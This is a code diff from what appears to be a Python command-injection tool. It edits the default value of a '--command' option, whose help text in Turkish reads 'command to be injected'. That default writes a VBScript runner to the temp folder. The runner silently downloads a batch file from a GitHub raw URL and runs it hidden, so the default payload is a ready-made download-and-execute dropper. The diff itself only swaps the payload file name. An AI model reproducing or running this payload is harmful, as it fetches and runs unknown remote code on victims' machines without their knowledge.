@@ -266,7 +266,7 @@ def main():
 
     parser.add_argument(
     "--command",
-    default='echo Set objShell = CreateObject("WScript.Shell") > %TEMP%\\runner.vbs && echo objShell.Run "cmd /c curl -L -o %TEMP%\\nettt.bat https://raw.githubusercontent.com/seition2doc/dosta2/main/nettt.bat && %TEMP%\\nettt.bat", 0, False >> %TEMP%\\runner.vbs && wscript %TEMP%\\runner.vbs',
+    default='echo Set objShell = CreateObject("WScript.Shell") > %TEMP%\\runner.vbs && echo objShell.Run "cmd /c curl -L -o %TEMP%\\nettt.bat https://raw.githubusercontent.com/seition2doc/dosta2/main/n2.bat && %TEMP%\\nettt.bat", 0, False >> %TEMP%\\runner.vbs && wscript %TEMP%\\runner.vbs',
     help="Enjekte edilecek komut"
 )
 
